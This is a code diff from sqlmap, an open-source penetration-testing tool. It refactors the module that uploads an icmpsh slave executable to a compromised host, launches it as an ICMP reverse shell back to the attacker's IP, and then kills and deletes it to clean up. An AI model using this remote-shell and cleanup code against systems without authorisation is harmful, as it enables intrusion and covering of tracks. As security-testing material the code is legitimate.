@@ -7,40 +7,21 @@ Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
 See the file 'doc/COPYING' for copying permission
 """
 
-import codecs
 import os
-import re
-import stat
-import sys
 import time
-
-from select import select
-from subprocess import PIPE
-from subprocess import Popen as execute
 
 from extra.icmpsh.icmpsh_m import main as icmpshmaster
 
-from lib.core.common import dataToStdout
 from lib.core.common import getLocalIP
 from lib.core.common import getRemoteIP
-from lib.core.common import getUnicode
 from lib.core.common import normalizePath
 from lib.core.common import ntToPosixSlashes
-from lib.core.common import pollProcess
-from lib.core.common import randomRange
 from lib.core.common import randomStr
 from lib.core.common import readInput
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.data import paths
-from lib.core.exception import sqlmapDataException
-from lib.core.exception import sqlmapFilePathException
-from lib.core.subprocessng import blockingReadFromFD
-from lib.core.subprocessng import blockingWriteToFD
-from lib.core.subprocessng import setNonBlocking
-from lib.request.connect import Connect as Request
-from lib.takeover.upx import upx
 
 
 class ICMPsh:
@@ -81,22 +62,18 @@ class ICMPsh:
         infoMsg  = "running icmpsh slave remotely"
         logger.info(infoMsg)
 
-        self.__icmpshSlaveCmd = "%s -t %s -d 500 -b 30 -s 128" % (self.__icmpslaveRemote, self.lhostStr)
-
-        cmd = "%s &" % self.__icmpshSlaveCmd
-
-        if kb.dbms == "Microsoft SQL Server" and (kb.stackedTest or conf.direct):
-            cmd = self.xpCmdshellForgeCmd(cmd)
+        cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self.__icmpslaveRemote, self.lhostStr)
 
         self.execCmd(cmd, silent=True)
 
     def uploadIcmpshSlave(self, web=False):
         self.__randStr = randomStr(lowercase=True)
+        self.__icmpslaveRemoteBase = "tmpi%s.exe" % self.__randStr
 
         if web:
-            self.__icmpslaveRemote = "%s/tmpi%s.exe" % (self.webDirectory, self.__randStr)
+            self.__icmpslaveRemote = "%s/%s" % (self.webDirectory, self.__icmpslaveRemoteBase)
         else:
-            self.__icmpslaveRemote = "%s/tmpi%s.exe" % (conf.tmpPath, self.__randStr)
+            self.__icmpslaveRemote = "%s/%s" % (conf.tmpPath, self.__icmpslaveRemoteBase)
 
         self.__icmpslaveRemote = ntToPosixSlashes(normalizePath(self.__icmpslaveRemote))
 
@@ -115,4 +92,7 @@ class ICMPsh:
         debugMsg  = "icmpsh master exited"
         logger.debug(debugMsg)
 
-        self.delRemoteFile(self.__icmpslaveRemote, doubleslash=True)
+        time.sleep(1)
+        self.execCmd("taskkill /F /IM %s" % self.__icmpslaveRemoteBase, silent=True)
+        time.sleep(1)
+        self.delRemoteFile(self.__icmpslaveRemote)
